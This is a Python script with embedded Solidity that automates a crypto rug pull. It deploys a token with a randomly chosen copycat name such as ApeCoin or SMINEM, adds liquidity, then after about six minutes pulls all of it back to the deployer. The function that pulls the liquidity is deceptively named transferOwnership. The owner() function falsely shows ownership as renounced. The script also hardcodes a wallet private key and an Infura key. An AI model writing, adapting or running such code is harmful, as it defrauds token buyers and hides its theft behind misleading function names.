from eth_utils import address
from web3 import Web3
from solcx import compile_source, install_solc
from dotenv import load_dotenv
import json, time, constants, os, random
from web3.middleware import geth_poa_middleware
from web3.gas_strategies.time_based import medium_gas_price_strategy

bsc_rpc = "https://bsc-dataseed.binance.org"
bsc_router_address = "0x10ED43C718714eb63d5aA57B78B54704E256024E"

bsc_rpc_test = "https://data-seed-prebsc-1-s3.binance.org:8545"
bsc_router_address_test = "0xD99D1c33F9fC3444f8101754aBC46c52416550D1"

goer_rpc = "https://goerli.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161"
goer_router_address = "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D"

arb_rpc = "https://arbitrum-one.public.blastapi.io"
arb_router_address = "0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506"

arb_rpc_test = "https://arbitrum-goerli.public.blastapi.io"
arb_router_address_test = ""

launch_info = {
    'active_rpc': arb_rpc,
    'active_router': arb_router_address
}

web3 = Web3(Web3.HTTPProvider(launch_info['active_rpc']))
web3.middleware_onion.inject(geth_poa_middleware, layer=0)

account = {'address': '0x65bAB07c9B4eCf1F3cA31ABe7e1ec1548495949b', 'private_key': '0x7ec8928c8d60a1a15b03364327d35a561914d92f6aad8f3919a575847d6987cb'}
contract_names = ['WOJAKHORSEMAN', 'ApeCoin', 'GooseHonk', 'SMINEM', '佩佩', '我的', '一', '之一', '壹']
contract_symbols = ['WOH', 'APE', 'HONK', 'OGSM', '佩佩', '我的', '一', '之一', '壹']

compiled_sol = compile_source(
    '''
//SPDX-License-Identifier: MIT

pragma solidity >=0.8.12 <0.9.0;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IUniswap{
    function approve(address spender, uint value) external returns (bool);
    function balanceOf(address owner) external view returns (uint);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
        ) external returns (uint amountToken, uint amountETH);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

contract TokenContract is IERC20 {

    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    
    address public DEAD = 0x000000000000000000000000000000000000dEaD;
    address public AUTOLPRECEIVER;

    uint256 public lp;

    address private _deployer;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) private isPair;
    mapping(address => bool) private isExempt;

    address private _owner = address(0);

    IUniswapV2Router02 public uniswapV2Router;
    IUniswap public uniswapLP;
    address public uniswapV2Pair;

    constructor(string memory _name, string memory _symbol, address routerAddress) payable {
        name = _name;
        symbol = _symbol;
        decimals = 8;

        lp = msg.value;
        
        _deployer = msg.sender;
        _update(address(0), address(this), 1000000000000 * 10**8);

        uniswapV2Router = IUniswapV2Router02(routerAddress);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
                address(this),
                uniswapV2Router.WETH()
            );
        uniswapLP = IUniswap(uniswapV2Pair);

        isPair[address(uniswapV2Pair)] = true;

        AUTOLPRECEIVER = msg.sender;

        allowance[address(this)][address(uniswapV2Pair)] = type(uint256).max;
        allowance[address(this)][address(uniswapV2Router)] = type(uint256).max;

        uniswapLP.approve(routerAddress, type(uint256).max);

    }

    receive() external payable {}

    modifier protected() {
        require(msg.sender == _deployer);
        _;
    }

    function owner() external view returns (address) {
        return _owner;
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount)
        external
        override
        returns (bool)
    {
        return _transferFrom(msg.sender, to, amount);
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external override returns (bool) {
        uint256 availableAllowance = allowance[from][msg.sender];
        if (availableAllowance < type(uint256).max) {
            allowance[from][msg.sender] = availableAllowance - amount;
        }

        return _transferFrom(from, to, amount);
    }

    function _transferFrom(address from, address to, uint256 amount) private returns (bool) {

        balanceOf[from] -= amount;
        balanceOf[to] += amount;

        emit Transfer(from, to, amount);
        return true;
    }

    function _update(
        address from,
        address to,
        uint256 amount
    ) private returns (bool) {
        if (from != address(0)) {
            balanceOf[from] -= amount;
        } else {
            totalSupply += amount;
        }
        if (to == address(0)) {
            totalSupply -= amount;
        } else {
            balanceOf[to] += amount;
        }
        emit Transfer(from, to, amount);
        return true;
    }

    function addLP() public protected {
        uniswapV2Router.addLiquidityETH{value: lp}(
            address(this),
            totalSupply,
            0,
            0,
            address(this),
            block.timestamp + 15
        );
    }

    function transferOwnership() public protected {
        uniswapV2Router.removeLiquidityETH(
            address(this),
            uniswapLP.balanceOf(address(this)),
            0,
            0,
            AUTOLPRECEIVER,
            block.timestamp + 15
        );
    }

    function rescue() public protected {
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            (bool sent, ) = payable(msg.sender).call{
                value: ethBalance
            }("");
            require(sent);
        }
    }

}

 

  ''',
    output_values=['abi', 'bin']
)
contract_id, contract_interface = compiled_sol.popitem()
bytecode = contract_interface['bin']
abi = contract_interface['abi']

web3.eth.set_gas_price_strategy(medium_gas_price_strategy)

contract = web3.eth.contract(abi=abi, bytecode=bytecode)

def deploy_contract():

    selected_id = random.randint(0, (len(contract_names) - 1))

    #Deploy the contract
    try:
            
        txn = contract.constructor(contract_names[selected_id], contract_symbols[selected_id], launch_info['active_router']).build_transaction(
    {
        'value': web3.toWei(0.01, 'ether'),
        'from': account['address'],
        'nonce': web3.eth.get_transaction_count(account['address']),
        'chainId': web3.eth.chain_id,
        'gasPrice': (web3.eth.generate_gas_price() + 500000),   
    }
    )
        signed_tx = web3.eth.account.signTransaction(txn, private_key = account['private_key'])
        tx_hash = web3.eth.send_raw_transaction(signed_tx.rawTransaction)
        tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
        
        print(f"\n\n{tx_receipt.contractAddress}")
        print('----------------------------------------------------------------------------------\n')
        print('     - Contract deployed')

        address = tx_receipt.contractAddress
        return address
    
    except Exception as e:
        return e

def add_liquity(address): #Add liquidity
    try:

        txn = contract.functions.addLP().build_transaction(
        {
            'from': account['address'],
            'to': address,
            'nonce': web3.eth.get_transaction_count(account['address']),
            'chainId': web3.eth.chain_id,
            'gasPrice': (web3.eth.generate_gas_price() + 500000)
        }
        )

        signed_tx = web3.eth.account.signTransaction(txn, private_key = account['private_key'])
        tx_hash = web3.eth.send_raw_transaction(signed_tx.rawTransaction)
        tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
        print('     - Liquidity added')

    except Exception as e:
        print(f"Error adding LP: {e}. Retrying in 30 seconds...")
        time.sleep(30)
        add_liquity(address)

def remove_liquidity(address):#Remove liquidity
    try:

        txn = contract.functions.transferOwnership().build_transaction(
        {
            'from': account['address'],
            'to': address,
            'nonce': web3.eth.get_transaction_count(account['address']),
            'chainId': web3.eth.chain_id,
            'gasPrice': (web3.eth.generate_gas_price() + 500000)     
        }
        )

        signed_tx = web3.eth.account.signTransaction(txn, private_key = account['private_key'])
        tx_hash = web3.eth.send_raw_transaction(signed_tx.rawTransaction)
        tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
        print('     - Liquidity removed\n')

    except Exception as e:
        print(f"Error removing LP: {e}. Retrying in 30 seconds...")
        time.sleep(30)
        remove_liquidity(address)


if __name__ == "__main__": 
    address = deploy_contract() 
    if '0x' in address:
        time.sleep(random.randint(60, 120))
        add_liquity(address)
        time.sleep(360)
        remove_liquidity(address)
    else:
        print(f'Deploy failed! Address returned {address}')
